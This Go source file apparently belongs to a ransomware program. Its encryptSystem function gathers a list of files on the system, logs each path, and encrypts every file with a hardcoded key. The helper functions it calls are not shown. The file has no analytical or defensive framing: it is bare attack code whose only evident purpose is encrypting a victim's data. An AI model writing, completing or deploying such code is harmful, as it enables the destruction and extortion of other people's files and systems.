package main

import (
	"log"
)

func encryptSystem() {
	log.Println("[-] Getting files on the system")
	files := fileList()
	log.Println("[+] Got files on the system")
	log.Println("[-]Starting to encrypt files")
	for _, path := range files {
		log.Println(path)
	}
	
	
	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
	
	
	for _, filename := range files {
		encrypt(filename, key)
	}
}

func main() {
	encryptSystem()
}
